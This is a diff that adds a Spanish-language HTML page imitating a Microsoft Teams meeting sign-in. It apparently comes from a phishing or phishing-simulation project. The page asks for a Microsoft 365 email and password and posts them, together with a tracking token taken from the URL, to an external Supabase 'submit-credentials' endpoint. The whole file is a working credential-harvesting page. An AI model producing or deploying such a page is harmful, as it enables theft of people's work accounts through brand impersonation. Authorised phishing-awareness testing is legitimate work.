@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8">
+<title>Microsoft Teams - Iniciar sesión</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#f2f2f2;font-family:'Segoe UI',Tahoma,Arial,sans-serif;color:#1b1b1b;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .box{background:#fff;width:100%;max-width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
+  .logo{height:24px;margin-bottom:24px}
+  h1{font-weight:600;font-size:22px;margin:0 0 8px}
+  .sub{font-size:14px;color:#605e5c;margin:0 0 24px}
+  input{width:100%;padding:6px 0;font-size:15px;border:none;border-bottom:1px solid #666;outline:none;background:transparent;margin-bottom:24px;font-family:inherit}
+  input:focus{border-bottom:2px solid #6264A7}
+  .row{text-align:right;margin-top:12px}
+  button{background:#6264A7;color:#fff;border:none;padding:8px 30px;font-size:15px;cursor:pointer;font-family:inherit;min-width:108px}
+  button:hover{background:#494b83}
+</style></head>
+<body>
+<div class="box">
+  <img class="logo" src="https://cdn.jsdelivr.net/gh/mikel-santisteban/deceptics-email-assets@main/microsoft.png" alt="Microsoft Teams">
+  <h1>Únete a la reunión</h1>
+  <p class="sub">Inicia sesión con tu cuenta de Microsoft 365 para acceder a la reunión de Teams.</p>
+  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
+    <input type="hidden" name="token" id="token-field">
+    <input type="email" name="email" placeholder="Correo de trabajo o escolar" required autofocus>
+    <input type="password" name="password" placeholder="Contraseña" required>
+    <div class="row"><button type="submit">Unirse</button></div>
+  </form>
+</div>
+<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
+</body></html>
